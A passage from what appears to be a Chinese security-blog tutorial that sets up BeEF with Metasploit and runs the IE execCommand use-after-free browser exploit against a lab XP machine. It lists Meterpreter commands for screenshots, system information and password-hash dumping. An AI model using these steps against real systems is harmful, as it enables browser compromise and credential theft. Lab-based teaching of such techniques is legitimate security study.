&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Imitate&nbsp;a&nbsp;specified&nbsp;web&nbsp;server&nbsp;(default&nbsp;root&nbsp;page,&nbsp;404&nbsp;default&nbsp;error&nbsp;page,&nbsp;&#39;Server&#39;&nbsp;HTTP&nbsp;response&nbsp;header)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;web_server_imitation:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enable:&nbsp;true
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type:&nbsp;&quot;apache&quot;&nbsp;#supported:&nbsp;apache,&nbsp;iis
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Experimental&nbsp;HTTPS&nbsp;support&nbsp;for&nbsp;the&nbsp;hook&nbsp;/&nbsp;admin&nbsp;/&nbsp;all&nbsp;other&nbsp;Thin&nbsp;managed&nbsp;web&nbsp;services
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enable:&nbsp;false
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;In&nbsp;production&nbsp;environments,&nbsp;be&nbsp;sure&nbsp;to&nbsp;use&nbsp;a&nbsp;valid&nbsp;certificate&nbsp;signed&nbsp;for&nbsp;the&nbsp;value
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;used&nbsp;in&nbsp;beef.http.dns_host&nbsp;(the&nbsp;domain&nbsp;name&nbsp;of&nbsp;the&nbsp;server&nbsp;where&nbsp;you&nbsp;run&nbsp;BeEF)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;key:&nbsp;&quot;beef_key.pem&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cert:&nbsp;&quot;beef_cert.pem&quot;
&nbsp;&nbsp;&nbsp;&nbsp;database:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;For&nbsp;information&nbsp;on&nbsp;using&nbsp;other&nbsp;databases&nbsp;please&nbsp;read&nbsp;the
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;README.databases&nbsp;file
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;supported&nbsp;DBs:&nbsp;sqlite,&nbsp;mysql,&nbsp;postgres
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;NOTE:&nbsp;you&nbsp;must&nbsp;change&nbsp;the&nbsp;Gemfile&nbsp;adding&nbsp;a&nbsp;gem&nbsp;require&nbsp;line&nbsp;like:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;&nbsp;gem&nbsp;&quot;dm-postgres-adapter&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;or
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;&nbsp;gem&nbsp;&quot;dm-mysql-adapter&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;if&nbsp;you&nbsp;want&nbsp;to&nbsp;switch&nbsp;drivers&nbsp;from&nbsp;sqlite&nbsp;to&nbsp;postgres&nbsp;(or&nbsp;mysql).
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Finally,&nbsp;run&nbsp;a&nbsp;&#39;bundle&nbsp;install&#39;&nbsp;command&nbsp;and&nbsp;start&nbsp;BeEF.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;driver:&nbsp;&quot;sqlite&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;db_file&nbsp;is&nbsp;only&nbsp;used&nbsp;for&nbsp;sqlite
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;db_file:&nbsp;&quot;db/beef.db&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;db&nbsp;connection&nbsp;information&nbsp;is&nbsp;only&nbsp;used&nbsp;for&nbsp;mysql/postgres
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;db_host:&nbsp;&quot;localhost&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;db_port:&nbsp;5432
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;db_name:&nbsp;&quot;beef&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;db_user:&nbsp;&quot;beef&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;db_passwd:&nbsp;&quot;beef123&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;db_encoding:&nbsp;&quot;UTF-8&quot;
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Credentials&nbsp;to&nbsp;authenticate&nbsp;in&nbsp;BeEF.&nbsp;Used&nbsp;by&nbsp;both&nbsp;the&nbsp;RESTful&nbsp;API&nbsp;and&nbsp;the&nbsp;Admin_UI&nbsp;extension
&nbsp;&nbsp;&nbsp;&nbsp;credentials:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;user:&nbsp;&nbsp;&nbsp;&quot;beef&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;passwd:&nbsp;&quot;beef&quot;
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Autorun&nbsp;modules&nbsp;as&nbsp;soon&nbsp;the&nbsp;browser&nbsp;is&nbsp;hooked.
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;NOTE:&nbsp;only&nbsp;modules&nbsp;with&nbsp;target&nbsp;type&nbsp;&#39;working&#39;&nbsp;or&nbsp;&#39;user_notify&#39;&nbsp;can&nbsp;be&nbsp;run&nbsp;automatically.
&nbsp;&nbsp;&nbsp;&nbsp;autorun:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enable:&nbsp;true
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;set&nbsp;this&nbsp;to&nbsp;FALSE&nbsp;if&nbsp;you&nbsp;don&#39;t&nbsp;want&nbsp;to&nbsp;allow&nbsp;auto-run&nbsp;execution&nbsp;for&nbsp;modules&nbsp;with&nbsp;target-&gt;user_notify
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;allow_user_notify:&nbsp;true
&nbsp;&nbsp;&nbsp;&nbsp;crypto_default_value_length:&nbsp;80
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Enable&nbsp;client-side&nbsp;debugging
&nbsp;&nbsp;&nbsp;&nbsp;client:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;debug:&nbsp;false
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;You&nbsp;may&nbsp;override&nbsp;default&nbsp;extension&nbsp;configuration&nbsp;parameters&nbsp;here
&nbsp;&nbsp;&nbsp;&nbsp;extension:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;requester:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enable:&nbsp;true
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;proxy:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enable:&nbsp;true
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;metasploit:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enable:&nbsp;true
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;social_engineering:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enable:&nbsp;true
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;evasion:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enable:&nbsp;false
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;console:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shell:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enable:&nbsp;false
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ipec:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enable:&nbsp;true</pre><pre class="brush:bash;toolbar:false">vim&nbsp;/usr/share/beef-xss/extensions/metasploit/config.yaml</pre><pre class="brush:bash;toolbar:false">#&nbsp;Copyright&nbsp;(c)&nbsp;2006-2013&nbsp;Wade&nbsp;Alcorn&nbsp;-&nbsp;wade@bindshell.net
#&nbsp;Browser&nbsp;Exploitation&nbsp;Framework&nbsp;(BeEF)&nbsp;-&nbsp;http://beefproject.com
#&nbsp;See&nbsp;the&nbsp;file&nbsp;&#39;doc/COPYING&#39;&nbsp;for&nbsp;copying&nbsp;permission
#
#&nbsp;Enable&nbsp;MSF&nbsp;by&nbsp;changing&nbsp;extension:metasploit:enable&nbsp;to&nbsp;true
#&nbsp;Then&nbsp;set&nbsp;msf_callback_host&nbsp;to&nbsp;be&nbsp;the&nbsp;public&nbsp;IP&nbsp;of&nbsp;your&nbsp;MSF&nbsp;server
#
#&nbsp;Ensure&nbsp;you&nbsp;load&nbsp;the&nbsp;xmlrpc&nbsp;interface&nbsp;in&nbsp;Metasploit
#&nbsp;msf&nbsp;&gt;&nbsp;load&nbsp;msgrpc&nbsp;ServerHost=10.211.55.2&nbsp;Pass=abc123&nbsp;ServerType=Web
#&nbsp;Please&nbsp;note&nbsp;that&nbsp;the&nbsp;ServerHost&nbsp;parameter&nbsp;must&nbsp;have&nbsp;the&nbsp;same&nbsp;value&nbsp;of&nbsp;host&nbsp;and&nbsp;callback_host&nbsp;variables&nbsp;here&nbsp;below.
#&nbsp;Also&nbsp;always&nbsp;use&nbsp;the&nbsp;IP&nbsp;of&nbsp;your&nbsp;machine&nbsp;where&nbsp;MSF&nbsp;is&nbsp;listening.
beef:
&nbsp;&nbsp;&nbsp;&nbsp;extension:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;metasploit:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;name:&nbsp;&#39;Metasploit&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enable:&nbsp;true
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;host:&nbsp;&quot;172.16.244.129&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;port:&nbsp;55552
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;user:&nbsp;&quot;msf&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pass:&nbsp;&quot;abc123&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;uri:&nbsp;&#39;/api&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ssl:&nbsp;false
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ssl_version:&nbsp;&#39;SSLv3&#39;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ssl_verify:&nbsp;true
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;callback_host:&nbsp;&quot;172.16.244.129&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;autopwn_url:&nbsp;&quot;autopwn&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;auto_msfrpcd:&nbsp;false
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;auto_msfrpcd_timeout:&nbsp;120
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msf_path:&nbsp;[&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{os:&nbsp;&#39;osx&#39;,&nbsp;path:&nbsp;&#39;/opt/local/msf/&#39;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{os:&nbsp;&#39;livecd&#39;,&nbsp;path:&nbsp;&#39;/opt/metasploit-framework/&#39;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{os:&nbsp;&#39;bt5r3&#39;,&nbsp;path:&nbsp;&#39;/opt/metasploit/msf3/&#39;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{os:&nbsp;&#39;bt5&#39;,&nbsp;path:&nbsp;&#39;/opt/framework3/msf3/&#39;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{os:&nbsp;&#39;backbox&#39;,&nbsp;path:&nbsp;&#39;/opt/metasploit3/msf3/&#39;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{os:&nbsp;&#39;win&#39;,&nbsp;path:&nbsp;&#39;c:\\metasploit-framework\\&#39;},
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{os:&nbsp;&#39;custom&#39;,&nbsp;path:&nbsp;&#39;/usr/share/metasploit-framework/&#39;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]</pre><p><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">原：</span><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"><br/></span></p><p><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span></p><pre class="brush:bash;toolbar:false">{os:&nbsp;&#39;custom&#39;,&nbsp;path:&nbsp;&#39;&#39;}</pre><p><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">修改成</span></p><pre class="brush:bash;toolbar:false">{os:&nbsp;&#39;custom&#39;,&nbsp;path:&nbsp;&#39;/usr/share/metasploit-framework/&#39;}</pre><p><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">修改 host callback_host两参数，改为beef主机IP</span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">重启postgresq、metasploit、服务</span></p><pre class="brush:bash;toolbar:false">service&nbsp;postgresql&nbsp;restart&nbsp;&amp;&nbsp;service&nbsp;metasploit&nbsp;restart</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"><br/></span></p><p style="text-align:center"><img style="width: 600px; height: 219px;" alt="t019e7cd4b2aa99d854.jpg" src="http://p8.qhimg.com/t0139e08d95d49e642a.jpg" title="t019e7cd4b2aa99d854.jpg" height="219" border="0" vspace="0" width="600"/></p><pre class="brush:bash;toolbar:false">msfconsole&nbsp;#启动Metasploit</pre><pre class="brush:bash;toolbar:false">load&nbsp;msgrpc&nbsp;ServerHost=172.16.244.129&nbsp;Pass=abc123</pre><p style="text-align:center"><img style="width: 600px; height: 647px;" alt="t0169debf48fbc3942a.jpg" src="http://p7.qhimg.com/t0157cb7119fd8abc71.jpg" title="t0169debf48fbc3942a.jpg" height="647" border="0" vspace="0" width="600"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">重启Beef</span></p><p style="text-align:center"><img style="width: 600px; height: 372px;" alt="t0190d651f583e54f3b.jpg" src="http://p4.qhimg.com/t013810b87d0c3b859d.jpg" title="t0190d651f583e54f3b.jpg" height="372" border="0" vspace="0" width="600"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">启动beef这里提示已经载入246个metasploit的EXP,MSF更新到最新版应该有五六百个EXP</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">进入Beef后台（莫名成了245 =。=！）</span></p><p style="text-align:center"><img style="width: 600px; height: 348px;" alt="t01d5aa2f783869c7f9.jpg" src="http://p8.qhimg.com/t01f14bca3e3a1c1ca1.jpg" title="t01d5aa2f783869c7f9.jpg" height="348" border="0" vspace="0" width="600"/></p><pre class="brush:bash;toolbar:false">use&nbsp;exploit/windows/browser/ie_execcommand_uaf
show&nbsp;options
set&nbsp;srvhost&nbsp;172.16.244.129
exploit/run</pre><p style="text-align:center"><img style="width: 600px; height: 319px;" alt="t01418a1cdbd8c6e6a1.jpg" src="http://p7.qhimg.com/t01104f819ff6263c17.jpg" title="t01418a1cdbd8c6e6a1.jpg" height="319" border="0" vspace="0" width="600"/></p><p style="text-align:center"><img style="width: 600px; height: 373px;" alt="t01560b8713b2414391.jpg" src="http://p6.qhimg.com/t01f178c2a3a0365422.jpg" title="t01560b8713b2414391.jpg" height="373" border="0" vspace="0" width="600"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">靶机被强行跳转到被监听的URL</span></p><p style="text-align:center"><img style="width: 600px; height: 360px;" alt="t0165e1ff04e684fc88.jpg" src="http://p1.qhimg.com/t01dd48208163201444.jpg" title="t0165e1ff04e684fc88.jpg" height="360" border="0" vspace="0" width="600"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">MSF成功监听到（但，貌似是虚拟机装的XP把这个漏洞补了，所以没产生session会话）</span></p><p style="text-align:center"><img style="width: 600px; height: 138px;" alt="t01fcc6b6cff8f19f8c.jpg" src="http://p5.qhimg.com/t01dd09e47b29d9a168.jpg" title="t01fcc6b6cff8f19f8c.jpg" height="138" border="0" vspace="0" width="600"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">如果XP没有打补丁，即存在这个EXP针对的漏洞，这里会产生一个session会话</span></p><pre class="brush:bash;toolbar:false">session&nbsp;-i&nbsp;1</pre><p style="text-align:center"><img style="width: 520px; height: 78px;" alt="t01645e28238ba42595.jpg" src="http://p8.qhimg.com/t0133efaa40190283a4.jpg" title="t01645e28238ba42595.jpg" height="78" border="0" vspace="0" width="520"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">screenshot 截屏：截取遭钓鱼主机的屏幕到本地文件</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">sysinfo 查看系统信息</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">hashdump dump目标主机的用户Hash</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(84, 141, 212);"><strong><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"><strong>0x0</strong></span>6更多Meterpreter的命令</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(84, 141, 212);"><strong><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">参考：</span></strong></span><br/><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span></p><p style="text-indent: 2em; text-align: left;"><a style="color: rgb(84, 141, 212); text-decoration: underline;" target="_blank" href="http://www.metasploit.cn/thread-640-1-1.html"><span style="color: rgb(84, 141, 212);">Meterpreter后渗透攻击命令</span></a><br/></p><p style="text-indent: 2em; text-align: left;"><a style="color: rgb(84, 141, 212); text-decoration: underline;" target="_blank" href="http://www.91ri.org/8476.html"><span style="color: rgb(84, 141, 212);">Metasploit工具Meterpreter的命令速查表</span></a><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"><br/></span><br/></p></p>
                <hr/>
                <p style="text-align: center;">
                    <img src="http://bobao.360.cn/img/app.jpeg"/>
                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
                </p>
                                <p>本文由 安全客 原创发布，如需转载请注明来源及本文地址。<br/>本文地址：http://bobao.360.cn/learning/detail/300.html
                </p>
                            </div>
            <div style="margin-top: 20px;background-color:#FFFFFF">
    <input type="hidden" id="detail_title" name="detail_title" value="内网渗透一：利用Xss漏洞和IE漏洞进入内网 - 安全客 - 有思想的安全新媒体" />
    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
    <a name="mao"></a>
    <div class="reg-log mobile-hiden">
        <div class="" id="userTo">   
            <div id="to-list" class="input-text" style="">
                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
                <ul id="preadded" style="display:none">       
                </ul>
                <div id="to-auto" style="width: 200px">
                    <ul id="feed">
                    </ul>
                </div>
            </div>
        </div>
        <input type="hidden" id="source-id" value="300" />
        <input type="hidden" id="source-type" value="learning" />
        <input type="hidden" id="post-comment-url" value="/comment/add" />
        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
        <input type="hidden" id="stoken_comment_set" value="64d932c9bb50dc5a83db601d9b02e735">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
            </div>
    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />

        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
    </div>


    <div class="clearfix"></div>
    <div class="comments">
        <div class="comments-head">
            <span class="title">用户评论</span>
        </div>
                <div class="comment-none alarm-info bg-primary">无任何评论</div>
            </div>
</div>
<script>
    $(function () {
        $('.anonymous-comment').click(function () {
            $(".join").hide();
            $(".reg-log textarea").first().removeAttr("disabled").show();
            $('#use_nickname').val('1');
//            $('#trigger-nickname').attr('checked', true);
            $('#trigger-nickname').trigger('click');
        });
        //为所有复选框绑定事件
//        checkbox_on_click();
        //ajax随机获取昵称
//        randnicknameajax(0);
        //ajax检测登录状态
        comment_check_login();
    });



    function input_checkbox(flag) {
        $('input:checkbox').each(function () {
            var value = flag ? 1 : 0;
            $(this).prop('checked', flag);
            $(this).val(value);
        });
    }

//ajax随机获取昵称
    function randnicknameajax(flag) {
        $.ajax({
            type: 'POST',
            url: $('#post-nickname-url-ajax').val(),
            data: {limit: 1, flag: flag},
            dataType: "json",
            success: function (data) {
                $('#nick-name').val(data.data[0]);
                _nick_name=data.data[0];
            }
        });
    }
    $();
//ajax检测登录状态
    function comment_check_login() {
        $.ajax({
            type: 'POST',
            url: $('#post-check-login-url-ajax').val(),
            data: {},
            dataType: "json",
            success: function (data) {
                if (data.success) {
                    $('.join').hide();
                    $(".reg-log textarea").first().removeAttr("disabled").show();
                    $("#span_use_nickname").show();
                    $('#use_nickname').val('0');
                    $('#use_nickname').attr('checked', false);
                }
            }
        });
    }
</script>        </div>
    </div>
    <div class="side-bar">
        <div class="mod hot-news">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
    </div>
    <ul class="links-list">
                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
                                <li><a href="/learning/detail/4424.html" alt="【知识】9月16日 - 每日安全知识热点" target="_blank">【知识】9月16日 - 每日安全知识热...</a></li>
                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
            </ul>
</div>        <!-- 友情链接 -->
        <div class="mod blog-links mobile-hide">
    <div class="head-bar clearfix">
        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
        <a href="/links/index.html" class="more">更多<i></i></a>
    </div>
        <ul class="links-list">
                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
            </ul>
    </div>
        <!-- 联系我们 -->
        <div class="mod contact mobile-hide" style="text-align:center">
    <div class="head-bar clearfix">
        <h2><i></i><span>关注我们</span></h2>
    </div>
    <!-- 微信关注 -->
    <ul class="contact-way">
        <li><a>微信关注</a></li>
    </ul>
    <div style="padding-left:20px;padding-bottom:15px;">
    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
    </div>
    
    <!-- APP下载 -->
    <ul class="contact-way">
